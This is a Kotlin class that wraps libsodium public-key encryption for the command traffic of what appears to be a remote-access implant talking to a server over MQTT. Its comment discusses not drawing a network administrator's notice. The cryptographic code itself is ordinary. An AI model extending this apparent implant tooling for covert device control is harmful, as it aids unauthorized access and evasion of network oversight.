/*
* This class provides encryption using the libsodium library.
* It encrypts all command responses before they go out on the wire and decrypt messages
* sent from the server.
* This should not be used as the only layer of protection for traffic, since MQTT traffic with
* encrypted payloads will probably be suspicious to an observant Network Administrator, and I
* probably made a mistake somewhere that will lead to the data being easily decrypted by a real
* cryptographer.
* ALL traffic should still be sent over SSL.
* */
package com.cooperthecoder.implant.crypto

import org.libsodium.jni.Sodium
import javax.security.auth.Destroyable

class NetworkEncryption(val serverPublicKey: ByteArray, val clientPrivateKey: ByteArray) : AsymmetricEncryption, Destroyable {

    constructor(serverPublicKey: String, clientPrivateKey: String) : this(
            Base64Encoder.decode(serverPublicKey),
            Base64Encoder.decode(clientPrivateKey)
    )

    companion object {
        private val NONCE_SIZE = Sodium.crypto_box_noncebytes()
        private val MAC_SIZE = Sodium.crypto_box_macbytes()
        private val MINIMUM_CIPHERTEXT_SIZE = NONCE_SIZE + MAC_SIZE
    }

    override fun isDestroyed(): Boolean {
        return clientPrivateKey.none { it != 0x00.toByte() }
    }

    override fun destroy() {
        clientPrivateKey.fill(0x00)
    }

    override fun encrypt(plaintext: String): String {
        val ciphertext = encrypt(plaintext.toByteArray())
        val encoded = Base64Encoder.encode(ciphertext)
        return encoded
    }

    override fun decrypt(nonceAndCiphertext: String): String {
        val ciphertextBytes = Base64Encoder.decode(nonceAndCiphertext)
        val plaintext = decrypt(ciphertextBytes)
        return String(plaintext)
    }

    override fun encrypt(plaintext: ByteArray): ByteArray {
        val ciphertext = ByteArray(ciphertextLength(plaintext))
        val nonce = nonce()
        val result = Sodium.crypto_box_easy(
                ciphertext,
                plaintext,
                plaintext.size,
                nonce,
                serverPublicKey,
                clientPrivateKey
        )
        if (result != 0) {
            throw AsymmetricEncryption.EncryptionException("Error encrypting message. Libsodium result code: $result")
        }
        return nonce.plus(ciphertext)
    }

    override fun decrypt(nonceAndCiphertext: ByteArray): ByteArray {
        if (nonceAndCiphertext.size < MINIMUM_CIPHERTEXT_SIZE) {
            throw AsymmetricEncryption.DecryptionException(
                    "Message cannot be shorter than $MINIMUM_CIPHERTEXT_SIZE bytes."
            )
        }
        val plaintext = ByteArray(plaintextLength(nonceAndCiphertext))
        val nonce = nonce(nonceAndCiphertext)
        val ciphertext = nonceAndCiphertext.copyOfRange(nonce.size, nonceAndCiphertext.size)
        val result = Sodium.crypto_box_open_easy(
                plaintext,
                ciphertext,
                ciphertext.size,
                nonce,
                serverPublicKey,
                clientPrivateKey
        )

        if (result != 0) {
            throw AsymmetricEncryption.DecryptionException(
                    "Error decrypting message. Libsodium result code: $result"
            )
        }
        return plaintext
    }

    private fun nonce(ciphertext: ByteArray? = null): ByteArray {
        val nonce = if (ciphertext == null) {
            val nonce = ByteArray(NONCE_SIZE)
            Sodium.randombytes(nonce, nonce.size)
            nonce
        } else {
            ciphertext.copyOf(NONCE_SIZE)
        }
        return nonce
    }

    private fun ciphertextLength(plaintext: ByteArray): Int = MAC_SIZE + plaintext.size

    private fun plaintextLength(ciphertext: ByteArray): Int = ciphertext.size - MINIMUM_CIPHERTEXT_SIZE
}